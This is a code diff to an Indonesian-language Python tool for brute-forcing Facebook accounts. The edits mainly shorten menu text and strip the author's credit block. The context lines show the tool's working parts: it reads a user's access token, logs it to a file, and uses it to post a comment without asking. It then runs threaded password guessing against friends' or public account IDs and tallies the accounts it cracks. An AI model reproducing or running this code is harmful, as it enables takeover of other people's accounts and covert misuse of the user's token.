@@ -22,16 +22,16 @@ def login():
 	if p in ('01','1'): #kondisi 1 login dengan token :)
 		print('\n[!] HARAP MASUKAN TOKEN ANDA [!]\n')
 		try:
-			t=input('[?] Access token anda : ')
+			t=input('[?] Token : ')
 			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
-			print('[√] Login berhasil [√]\nDengan nama facebook :',r['name'])
+			print('[√] Login berhasil [√]\nWellcome :',r['name'])
 			open('log.txt','a').write(t)
 			req.post(f'https://graph.facebook.com/136921208435288/comments/?message=Hallo saya pengguna script mu hihi&access_token={t}')
 			time.sleep(2)
 			nampung(t).menu()
 		except KeyError:
 			os.system('clear')
-			print('[×] Access token Facebook salah [×]')
+			print('[×] token Facebook salah [×]')
 			time.sleep(2)
 			login()
 	elif p in ('02','2'): #kondisi 2 login dengan cookies
@@ -167,7 +167,7 @@ class nampung:
 					for pw in pwList[1:19]:tokai.submit(crack(self.token).crack1,id,pw,pwList[-1])
 				except:pass
 		print(f'[   Crack selesai | hasil dapet OK:-{str(ok)} CP:-{str(cp)}   ]\n')
-		b=input('[ ENTER UNTUK KEMBALI ]')
+		b=input('[ BACK ]')
 		self.menu()
 	def sendPublik(self):
 		os.system('clear')
@@ -192,22 +192,18 @@ class nampung:
 					for pw in pwList[1:19]:tokai.submit(crack(self.token).crack2,id,pw,pwList[-1])
 				except:pass
 		print(f'[   Crack selesai | hasil dapet OK:-{str(ok)} CP:-{str(cp)}   ]\n')
-		b=input('[ ENTER UNTUK KEMBALI ]')
+		b=input('[ BACK ]')
 		self.menu()
 	def menu(self):
 		os.system('clear')
 		os.system('clear')
 		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)
-		print(f'{judul}\n[   Hallo',r['name']+', Selamat datang di tools versi: BETA   ]\n\n[1]. Crack daftar teman fb kamu\n[2]. Crack daftar teman/id publik\n[3]. Informasi tools ini\n[9]. Logout akun kamu\n')
+		print(f'{judul}\n[   Hallo',r['name']+', WELLCOME TO MY SCRIPT   ]\n\n[1]. Crack daftar teman\n[2]. Crack daftar id publik\n[0]. Logout\n')
 		while True:
 			p=input('[?] Pilih yang mana : ')
 			if p in ('01','1'):self.sendTeman()
 			elif p in ('02','2'):self.sendPublik()
-			elif p in ('03','3'):
-				print('\n[ Hallo kak! Ini adalah tools bruteforce/crack facebook!! Tools ini dibuat oleh Latip Harkat dengan github Latip176 ]\n\nInformasi Sosmed\n1. Facebook\t: Latip Harkat\n2. WhatsApp\t: 083870396203\n\nJika mengalamin kendala saat memakai tools hubungi social media diatas terima kasih.\n')
-				b=input('[   ENTER UNTUK KEMBALI   ]')
-				self.menu()
-			elif p=='9':
+			elif p=='0':
 				os.system('rm -rf log.txt')
 				exit('[√] Logout berhasil [√]')
 			else:print('[!] Pilihan tidak ada\n')
